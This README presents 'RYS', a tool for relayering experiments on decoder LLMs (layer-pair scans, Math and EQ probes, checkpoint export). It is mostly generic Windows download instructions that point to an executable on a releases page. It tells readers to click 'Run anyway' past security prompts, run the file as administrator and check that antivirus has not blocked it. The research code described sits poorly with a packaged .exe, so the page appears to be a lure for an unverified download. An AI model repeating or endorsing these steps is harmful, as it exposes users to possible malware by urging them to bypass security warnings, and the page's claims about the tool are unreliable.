# 🔁 RYS - Reproduce relayering runs with ease

[![Download RYS](https://img.shields.io/badge/Download%20RYS-blue?style=for-the-badge)](https://github.com/unreliable-marmalade23/RYS/releases)

## 🧾 What RYS does

RYS helps you run relayering experiments on decoder LLMs. It lets you test a layer path where part of the model runs twice, without changing the model weights.

Use it to:

- scan many layer pairs
- test Math and EQ probes
- run multi-block beam search
- export relayered Hugging Face checkpoints
- view heatmaps and balance checks for Math + EQ runs

RYS is set up for repeatable experiments. It keeps the main pieces in one place so you can rerun the same workflow without rebuilding everything by hand.

## 📥 Download RYS

1. Open the [RYS releases page](https://github.com/unreliable-marmalade23/RYS/releases)
2. Download the latest release for Windows
3. Save the file to your computer
4. If the release comes as a .zip file, extract it first
5. If the release includes a .exe file, double-click it to run RYS

If your browser asks where to save the file, choose a folder you can find again, such as Downloads or Desktop.

## 🖥️ Windows setup

RYS is meant to run on a Windows PC.

Recommended setup:

- Windows 10 or Windows 11
- At least 8 GB of RAM
- 20 GB of free disk space
- A modern CPU
- A recent NVIDIA GPU if you plan to run larger model jobs

If you only want to open the app and inspect the included files, a standard Windows laptop is enough.

## 📂 What is inside

The release includes the parts needed for the main experiment workflow.

Main folders and files:

- `datasets/`
  - `math_16.json`
  - `math_120.json`
  - `eq_16.json`
  - `eq_140.json`
  - `manifest.json`
- `src/core/`
  - config parsing
  - layer-list handling

These files support the experiment set, probe runs, and analysis tools used by RYS.

## 🪟 How to install on Windows

1. Open the release page
2. Download the latest Windows package
3. Right-click the downloaded `.zip` file
4. Select Extract All
5. Choose a folder, such as `Downloads\RYS`
6. Open the extracted folder
7. Look for the app file or start file included in the release
8. Double-click it to launch RYS

If Windows shows a security prompt:

- choose More info
- then choose Run anyway if you trust the file from the release page

If the app opens in a folder view instead of starting right away, look for a file named like:

- `RYS.exe`
- `start.exe`
- `launch.bat`

## 🚀 First run

When you open RYS for the first time:

1. Let the app finish loading
2. Check that the included datasets are in place
3. Pick the model or experiment file you want to use
4. Select the run type you need
5. Start with a small test run first

A small test run helps confirm that the app can read files and start a workflow without issues.

## 🧠 Basic workflow

RYS uses a simple relayering path:

- run layers `0 .. j-1`
- jump back
- run layers `i .. N-1`
- layers `i .. j-1` are visited twice

The standard pair format is `(i, j)`.

What the key values mean:

- `(0, 0)` means no duplication
- `i` is the layer where the second path starts
- `j` is the layer where the first path stops before the jump

You do not need to change model weights. RYS only changes the order in which layers are visited.

## 🔍 Scan a full `(i, j)` grid

Use the scanner when you want to test many relayering pairs.

Typical steps:

1. Choose the model
2. Choose the dataset
3. Set the layer range
4. Run the full `(i, j)` scan
5. Review the results in the output folder

This is useful when you want to compare many layer paths and find which pairs give the best result for a task.

## 📊 Math and EQ probe sets

RYS includes fixed probe sets for:

- Math
- EQ

These sets help you compare runs with the same test data. That makes results easier to read and compare.

Use them when you want to:

- test a model after relayering
- compare one layer pair against another
- check whether a run helps one task more than the other

The bundled files are ready to use, so you can start without building new data first.

## 🧩 Multi-block beam search

RYS also supports multi-block beam search.

Use this when you want to test more than one relayering block and compare several paths in one run.

Good use cases:

- broader search over layer layouts
- exploring more than one repeated section
- finding strong paths before exporting a checkpoint

## 📦 Export relayered checkpoints

RYS includes a model exporter for Hugging Face checkpoints.

Use the exporter when you want to save a relayered version of a model for later use.

Basic flow:

1. Choose the base model
2. Choose the `(i, j)` layout
3. Set the export folder
4. Run the exporter
5. Load the saved checkpoint in your next workflow

The exporter writes a checkpoint that reflects the relayered path while keeping the original weights intact.

## 🗺️ Heatmaps and balanced analysis

RYS includes heatmap tools and balanced Math + EQ analysis.

Use these tools to:

- view patterns across layer pairs
- compare task balance
- spot strong or weak regions in the scan
- review results in a visual form

Heatmaps work well after a large scan because they turn a long result list into something easier to inspect.

## 🗃️ Files you may want to keep together

Keep these in one place for easier use:

- the RYS release folder
- the `datasets/` folder
- your model files
- any exported checkpoints
- the output folder from scans and probes

A simple folder layout helps when you want to rerun the same setup later.

Example:

- `C:\RYS\`
  - `app`
  - `datasets`
  - `models`
  - `outputs`

## 🛠️ Common tasks

### Open the app

1. Go to the extracted RYS folder
2. Double-click the app file
3. Wait for it to load

### Run a test scan

1. Open RYS
2. Pick a model
3. Pick a dataset
4. Choose a small `(i, j)` range
5. Start the scan

### Export a checkpoint

1. Open the exporter
2. Choose the relayering layout
3. Select a save folder
4. Run the export
5. Use the saved checkpoint later

### View analysis

1. Open the results folder
2. Load the scan output
3. Open the heatmap or balance view
4. Compare task results

## 🔧 If something does not open

Try these steps:

1. Make sure the file finished downloading
2. Extract the `.zip` file before opening anything
3. Right-click the app and choose Run as administrator
4. Check that your antivirus did not block the file
5. Move the folder to a simple path like `C:\RYS`
6. Try the latest release again

If the app still does not start, download the release again from the releases page and replace the old files.

## 📁 Repo contents

RYS includes:

- dataset files for Math and EQ testing
- core parsing code
- layer-list handling
- scan and export workflow parts
- analysis helpers

This keeps the main experiment path in one repo and makes it easier to repeat.

## 🔗 Get the latest release

[![Download RYS Release](https://img.shields.io/badge/Visit%20Releases-grey?style=for-the-badge)](https://github.com/unreliable-marmalade23/RYS/releases)

Open the releases page, download the latest Windows package, extract it, and run the included app file